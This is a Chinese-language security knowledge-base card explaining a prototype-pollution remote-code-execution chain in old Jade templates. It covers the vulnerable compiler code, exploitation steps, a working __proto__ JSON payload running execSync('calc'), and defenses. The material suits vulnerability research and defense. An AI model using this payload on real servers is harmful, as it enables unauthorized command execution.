---
id: web-nodejs-prototype-pollution-jade-line-debugitem-rce
title: Jade 模板原型污染 RCE：污染 Object.prototype.self + line，让 Compiler.visit 把调试行号原样拼进 new Function
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: jade-line-debugitem-prototype-pollution-rce
tags:
- nodejs
- prototype-pollution
- jade
- pug
- template-engine
- compile-debug
- rce
- javascript
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V560
  verified_at: '2026-11-12T07:42:09+08:00'
  notes: 已对照原文Jade一节与img16-22核对：self+line污染、Compiler.visit把node.line拼进jade_debug.DebugItem、self=1走var self=locals分支、renderFile→handleTemplateCache→fn(locals,Object.create(runtime))触发，均与截图一致；已修正两处表述（被注入节点为部分无自有line的Block而非根Block——图19根Block有line:0；compileDebug改为文章指出可污染为true且截图中options.compileDebug=1、PoC载荷未含该字段）；dedup判new，库内无Jade模板污染卡，非同链；未实际复现
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-jade-line-debugitem-rce/
draft: false
kb_aliases:
- Jade 原型链污染 RCE
- jade line 注入
- jade_debug.DebugItem 注入
- self=1 模板污染
- Jade 模板引擎 RCE
---

## 一句话结论

旧版 Jade（后改名 Pug）在 `compileDebug` 开启时，`Compiler.visit(node)` 会把 `node.line` 原样拼进生成代码 `jade_debug.unshift(new jade.DebugItem( <node.line>, ... ))`，而 `parse` 在 `options.self` 为真时生成 `var self = locals || {};` 包裹；攻击者通过原型污染写入 `Object.prototype.self = 1` 和 `Object.prototype.line = <命令执行表达式>`，使没有自有 `line` 属性的 AST 节点读到污染值，模板渲染时该表达式被求值执行，形成 RCE。

## 原理

- **编译链路**：Express `res.render('index.jade')` → `exports.__express` → `renderFile` → `handleTemplateCache(options)(options)` → `exports.compile` → `parse(str, options)` → `Compiler.compile()` → `new Function('locals, jade', fn)` → `fn(locals, Object.create(runtime))` 渲染。
- **line 拼接点**：`compiler.js` 的 `visit` 在 debug 模式下：
  ```js
  if (debug) {
    this.buf.push('jade_debug.unshift(new jade.DebugItem( ' + node.line
      + ', ' + (node.filename ? utils.stringify(node.filename) : 'jade_debug[0].filename')
      + ' ));');
  }
  ```
  `node.line` 被当作表达式源码直接拼接。对于没有自有 `line` 属性的节点（如部分自身无 line 的 Block 节点；截图 19 中根 Block 自带 line:0，图 20 被注入的 Block 对象仅含 nodes），属性查找会沿原型链取到 `Object.prototype.line`。
- **self 拼接点**：`parse` 中
  ```js
  var body = ''
    + 'var buf = [];\n'
    + 'var jade_mixins = {};\n'
    + 'var jade_interp;\n'
    + (options.self ? 'var self = locals || {};\n' + js : addWith('locals || {}', '\n' + js, globals)) + ';'
    + 'return buf.join("");';
  ```
  污染 `self` 为真后生成 `var self = locals || {};` 分支，使注入的 DebugItem 语句在模板函数体顶层直接执行（而不是被包在 `with(locals||{})` 内），与文章给出的完整利用条件一致。
- **compileDebug 前提**：生产环境（`NODE_ENV=production`）且未显式设置时 `options.compileDebug` 会被置 false，debug 语句不生成；文章指出该字段同样可经原型污染置 true 以开启 debug 分支（截图中 `options.compileDebug=1`；index.js 的 PoC 载荷只含 self/line，未含该字段）。
- **为什么需要 `self`**：文章把 `self` 与 `line` 作为同一组污染字段演示，`self=1` 切换代码生成分支；`line` 里的表达式最终作为 `new jade.DebugItem(<expr>, ...)` 的参数在渲染时求值，命令随之执行。

## 触发条件

- 应用使用旧版 jade 模板引擎（非 pug 新版）且存在原型污染原语；
- 模板编译时 `compileDebug` 生效（默认开启，生产环境需污染 `compileDebug` 为 true）；
- 攻击者能触发 `res.render` 渲染一个 jade 模板。

## 利用步骤

1. 确认 Express 视图引擎为 jade（`app.set('view engine','jade')`），并找到原型污染入口。
2. 污染 `Object.prototype.self = 1`、`Object.prototype.line = "global.process.mainModule.require('child_process').execSync('calc')"`，若生产环境再污染 `compileDebug = true`。
3. 访问触发 `res.render` 的路由。
4. 观察生成函数体中 `new jade.DebugItem( global.process...execSync('calc'), ... )` 被求值，命令执行。

## PoC

```json
{
  "__proto__": {
    "self": 1,
    "line": "global.process.mainModule.require('child_process').execSync('calc')"
  }
}
```

生成的模板函数片段（调试器观察）：

```js
var buf = [];
var jade_mixins = {};
var jade_interp;
var self = locals || {};
jade_debug.unshift(new jade.DebugItem( 0, "D:\\webnode\\...\\index.jade" ));
...
jade_debug.unshift(new jade.DebugItem( global.process.mainModule.require('child_process').execSync('calc'), jade_debug[0].filename ));
...
return buf.join("");
```

## 变体与关联

- EJS 的同思路字段注入：`outputFunctionName`、`escapeFunction`、`destructuredLocals`、`localsName`，见 [[web-nodejs-prototype-pollution-ejs-outputfunctionname-rce]]、[[web-nodejs-prototype-pollution-lodash-ejs-escapefunction-rce]]、[[web-nodejs-prototype-pollution-ejs-destructuredlocals-rce]]、[[web-nodejs-prototype-pollution-ejs-localsname-with-rce]]；
- lodash.template 的 sourceURL 原型污染注入同样利用"选项字段拼进 Function 源码"，见 [[web-nodejs-prototype-pollution-lodash-template-sourceurl-rce]]；
- 新版 Pug 的 Compiler 实现与选项名可能不同，需要按版本重新调试（本文针对旧 jade）。

## 检测与防御

- 修复原型污染入口（避免用户 JSON 递归 merge、使用 `Object.create(null)`/冻结原型）；
- 生产环境显式设置 `compileDebug=false`，不要依赖 NODE_ENV 默认值；
- 升级 jade/pug 到维护版本；审计模板引擎把选项字段拼进生成代码的所有位置；
- 运行时监控 `new Function` 生成内容中的 `process.mainModule`/`child_process` 关键字，及渲染路由的异常执行行为。
